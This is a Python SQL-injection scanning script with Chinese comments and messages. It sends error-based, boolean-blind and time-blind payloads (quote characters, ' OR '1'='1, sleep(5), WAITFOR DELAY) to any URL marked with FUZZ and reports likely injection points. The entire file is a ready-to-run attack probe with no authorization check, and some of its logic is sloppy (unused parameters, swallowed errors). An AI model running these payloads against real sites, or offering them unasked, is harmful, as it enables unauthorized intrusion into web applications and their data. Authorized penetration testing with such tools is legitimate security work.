#!/usr/bin/env python3
"""SQL注入快速检测 — 用时间盲注+布尔盲注快速判断注入点"""
import argparse, json, subprocess, sys, time, urllib.parse

PAYLOADS = {
    "boolean": [
        ("' OR '1'='1", "' OR '1'='2"),
        ("' AND '1'='1", "' AND '1'='2"),
        ("1' AND '1'='1--", "1' AND '1'='2--"),
    ],
    "time": [
        ("' AND sleep(5)--", 5),
        ("1' AND sleep(5)--", 5),
        ('" AND sleep(5)--', 5),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
    ],
    "error": [
        "'", '"', "1'", "1%27",
    ]
}

def check_sqli(target, param="id", value="1", timeout=10):
    url = target if target.startswith("http") else f"https://{target}"
    results = []
    
    # 1. 错误注入
    for p in PAYLOADS["error"]:
        try:
            test_url = url.replace("FUZZ", urllib.parse.quote(p))
            r = subprocess.run(["curl", "-sk", "-m", str(timeout), test_url], capture_output=True, text=True, timeout=timeout+5)
            body = r.stdout.lower()
            for err in ["sql", "syntax", "mysql", "postgresql", "oracle", "odbc", "driver", "database", "error in your"]:
                if err in body:
                    results.append({"type": "error", "payload": p, "evidence": err, "confidence": "high"})
                    break
        except: pass
    
    # 2. 布尔盲注
    for true_p, false_p in PAYLOADS["boolean"]:
        try:
            t1 = time.time()
            r1 = subprocess.run(["curl", "-sk", "-m", "10", f"{url.replace('FUZZ', urllib.parse.quote(true_p))}", "-w", "%{size_download}"], capture_output=True, text=True, timeout=15)
            t2 = time.time()
            r2 = subprocess.run(["curl", "-sk", "-m", "10", f"{url.replace('FUZZ', urllib.parse.quote(false_p))}", "-w", "%{size_download}"], capture_output=True, text=True, timeout=15)
            if r1.stdout != r2.stdout:
                results.append({"type": "boolean", "payload": true_p, "evidence": "响应差异", "confidence": "high"})
                break
        except: pass
    
    # 3. 时间盲注
    for p, delay in PAYLOADS["time"]:
        try:
            t0 = time.time()
            r = subprocess.run(["curl", "-sk", "-m", str(delay+5), f"{url.replace('FUZZ', urllib.parse.quote(p))}"], capture_output=True, text=True, timeout=delay+10)
            elapsed = time.time() - t0
            if elapsed >= delay - 0.5:
                results.append({"type": "time", "payload": p, "elapsed": f"{elapsed:.1f}s", "confidence": "high"})
                break
        except: pass
    
    return results

def main():
    ap = argparse.ArgumentParser(description="SQL注入快速检测")
    ap.add_argument("--target", required=True, help="目标URL,注入点用FUZZ标记")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("-o", "--output")
    args = ap.parse_args()
    
    results = check_sqli(args.target)
    result = {"target": args.target, "vulnerable": len(results) > 0, "findings": results}
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
    
    if args.json:
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print(f"[*] SQLi检测: {args.target}")
        if results:
            print(f"[!] 发现 {len(results)} 个注入点:")
            for r in results:
                print(f"  [{r['confidence']}] {r['type']}: {r['payload']} ({r.get('evidence','')})")
        else:
            print("  未发现注入点")

if __name__ == "__main__":
    main()